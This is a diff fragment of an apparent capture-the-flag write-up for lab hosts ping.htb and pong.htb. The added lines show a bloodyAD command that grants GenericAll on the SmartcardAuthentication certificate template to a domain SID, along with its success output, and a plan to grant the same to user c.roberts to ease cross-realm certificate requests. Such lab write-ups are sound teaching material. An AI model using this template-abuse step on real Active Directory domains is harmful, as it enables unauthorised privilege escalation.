@@ -1240,8 +1240,13 @@ The first sets `Enrollee Supplies Subject` to true
 And the second allows for client authentication
 
 ```python
-
+❯❯❯ faketime -f +8h bloodyAD --host dc1.ping.htb -d pong.htb -k add genericAll "CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb" 'S-1-5-21-750635624-2058721901-1932338391-2617'
+[+] S-1-5-21-750635624-2058721901-1932338391-2617 has now GenericAll on CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb
 ```
+
+Ill also give to `c.roberts` since they are in the `ping.htb` domain, so it will make requesting the certificate much easier by bypassing the cross realm
+
+
 
 
 
